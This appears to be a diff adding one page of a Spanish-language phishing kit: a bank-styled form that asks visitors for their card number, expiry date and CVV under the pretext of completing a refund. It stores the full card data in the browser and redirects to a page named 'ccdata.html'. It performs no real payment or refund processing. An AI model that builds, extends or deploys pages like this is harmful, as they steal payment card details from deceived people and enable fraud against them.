@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Formulario de Tarjeta de Crédito</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+    <script src="js/jquery-3.7.7.js"></script>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            background: #ffffff;
+            padding: 20px 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 400px;
+        }
+        .container img {
+            margin-bottom: 20px;
+        }
+        .container h2 {
+            margin-bottom: 10px;
+        }
+        .container h6 {
+            margin-bottom: 20px;
+            color: #666;
+        }
+        .form input[type="text"] {
+            width: calc(100% - 50px);
+            background-color: transparent;
+            border: 0;
+            border-bottom: 0.1rem solid #fdda24;
+            padding: 10px 0;
+            padding-left: 30px;
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 20px;
+        }
+        .form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #fdda24;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+        }
+        .form button:hover {
+            background-color: #e1c200;
+        }
+        #icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        #is-relative {
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form class="form" id="paymentForm">
+            <div>
+                <img src="../img/cc.png" width="250" alt="Icono de Tarjeta de Crédito" />
+                <h2>¡INGRESA TARJETA DE DESEMBOLSO!</h2>
+                <h6>Por favor ingrese los datos de su tarjeta de crédito o débito para completar el reembolso.</h6>
+            </div>
+            <div id="is-relative">
+                <input
+                    type="text"
+                    id="creditCardNumber"
+                    placeholder="Número de Tarjeta de Crédito o Débito"
+                    required=""
+                    maxlength="19"
+                />
+                <span id="icon">
+                    <i class="fas fa-credit-card"></i>
+                </span>
+            </div>
+            <div id="is-relative">
+                <input
+                    type="text"
+                    id="expirationDate"
+                    placeholder="Fecha de Expiración (MM/AA)"
+                    required=""
+                    maxlength="5"
+                    oninput="formatExpirationDate(this)"
+                />
+                <span id="icon">
+                    <i class="fas fa-calendar-alt"></i>
+                </span>
+            </div>
+            <div id="is-relative">
+                <input
+                    type="text"
+                    id="cvv"
+                    placeholder="CVV"
+                    required=""
+                    maxlength="4"
+                    oninput="formatCVV(this)"
+                />
+                <span id="icon">
+                    <i class="fas fa-lock"></i>
+                </span>
+            </div>
+            <button type="submit">Terminar Solicitud</button>
+        </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <script>
+        const form = document.querySelector("#paymentForm");
+
+        form.addEventListener("submit", (event) => {
+            event.preventDefault(); // Evita que se envíe el formulario
+
+            // Obtener los datos del formulario
+            const creditCardNumber = document.querySelector("#creditCardNumber").value.replace(/\s+/g, ''); // Eliminar espacios en blanco
+            const expirationDate = document.querySelector("#expirationDate").value;
+            const cvv = document.querySelector("#cvv").value;
+
+            // Validar los campos
+            if (!creditCardNumber || !expirationDate || !cvv) {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+
+            // Crear un objeto con los datos
+            const cardData = {
+                creditCardNumber: creditCardNumber,
+                expirationDate: expirationDate,
+                cvv: cvv,
+            };
+
+            // Guardar el objeto completo en el localStorage
+            localStorage.setItem("cardData", JSON.stringify(cardData));
+
+            // Redirigir a la página ccdata.html
+            window.location.href = "ccdata.html"; // Redirige a la página de datos de tarjeta
+        });
+
+        function formatExpirationDate(input) {
+            let expirationDate = input.value.replace(/\D/g, '').trim();
+
+            if (expirationDate.length > 4) {
+                expirationDate = expirationDate.substring(0, 4);
+            }
+
+            if (expirationDate.length >= 2) {
+                expirationDate = expirationDate.substring(0, 2) + '/' + expirationDate.substring(2);
+            }
+            input.value = expirationDate;
+        }
+
+        function formatCVV(input) {
+            let cvv = input.value.replace(/\D/g, '').trim();
+
+            if (cvv.length > 4) {
+                cvv = cvv.substring(0, 4);
+            }
+
+            input.value = cvv;
+        }
+    </script>
+</body>
+</html>
